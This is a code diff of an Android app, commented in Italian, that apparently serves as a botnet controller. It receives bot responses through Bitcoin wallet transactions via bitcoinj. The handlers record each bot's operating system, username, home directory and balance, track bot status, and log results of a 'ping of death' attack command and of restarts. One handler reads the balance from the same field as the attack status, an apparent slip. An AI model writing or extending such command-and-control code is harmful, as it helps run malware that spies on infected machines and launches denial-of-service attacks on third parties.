@@ -13,15 +13,12 @@ import android.widget.TextView;
 
 import org.bitcoinj.core.Coin;
 import org.bitcoinj.core.Transaction;
-import org.bitcoinj.core.TransactionOutPoint;
-import org.bitcoinj.core.TransactionOutput;
 import org.bitcoinj.core.listeners.DownloadProgressTracker;
 import org.bitcoinj.wallet.Wallet;
 import org.bitcoinj.wallet.listeners.WalletCoinsReceivedEventListener;
 
 import java.util.Collection;
 import java.util.Date;
-import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -66,41 +63,59 @@ public class MainActivity extends AppCompatActivity {
 
                     Log.d("App", "address:" + addressString);
 
+                    String balance = "";
+
                     if (appState.hasMapAddress(addressString)) {
                         switch (comando) {
-                            case ("os"):
+                            case ("os_ok"):
                                 appState.setStatoBot(addressString, appState.BOT_STATE_ONLINE);
                                 String os = v[2];
+                                balance = v[3];
                                 appState.db.updateOs(addressString, os);
+                                appState.db.updateBalance(addressString, balance);
                                 //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + os);
-                                Log.d("App", "SISTEMA OPERATIV BOT: " + os);
+                                Log.d("App", "SISTEMA OPERATIV BOT: " + os +", BALANCE = " +balance);
                                 break;
                             case ("ping_ok"):
                                 appState.setStatoBot(addressString, appState.BOT_STATE_ONLINE);
+                                balance = v[2];
+                                appState.db.updateBalance(addressString, balance);
                                 for (String s : appState.mappaIndirizzi.keySet()) {
                                     Log.d("App", "indirizzo " + s + " valore " + appState.mappaIndirizzi.get(s));
                                 }
                                 break;
-                            case ("username"):
+                            case ("username_ok"):
                                 appState.setStatoBot(addressString, appState.BOT_STATE_ONLINE);
                                 String username = v[2];
+                                balance = v[3];
+                                appState.db.updateBalance(addressString, balance);
                                 appState.db.updateUsername(addressString, username);
                                 //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + username);
                                 Log.d("App", "SISTEMA OPERATIV BOT: " + username);
                                 break;
-                            case ("userhome"):
+                            case ("userhome_ok"):
                                 appState.setStatoBot(addressString, appState.BOT_STATE_ONLINE);
                                 String userhome = v[2];
+                                balance = v[3];
+                                appState.db.updateBalance(addressString, balance);
                                 appState.db.updateUserHome(addressString, userhome);
                                 //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + userhome);
                                 Log.d("App", "USERHOME BOT: " + userhome);
                                 break;
-                            case ("pingOfDeath"):
+                            case ("pingOfDeath_ok"):
                                 appState.setStatoBot(addressString, appState.BOT_STATE_ONLINE);
                                 String pingOfDeath = v[2];
+                                balance = v[2];
+                                appState.db.updateBalance(addressString, balance);
                                 appState.db.updatePingOfDeath(addressString, pingOfDeath);
                                 //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + userhome);
                                 Log.d("App", "PING OF DEATH BOT: " + pingOfDeath);
+                                break;
+                            case ("restart_ok"):
+                                appState.setStatoBot(addressString, appState.BOT_STATE_START);
+                                balance = v[2];
+                                appState.db.updateBalance(addressString, balance);
+                                //appState.writeQuestFile("SISTEMA OPERATIV BOT: " + userhome);
                                 break;
                             default:
                                 break;
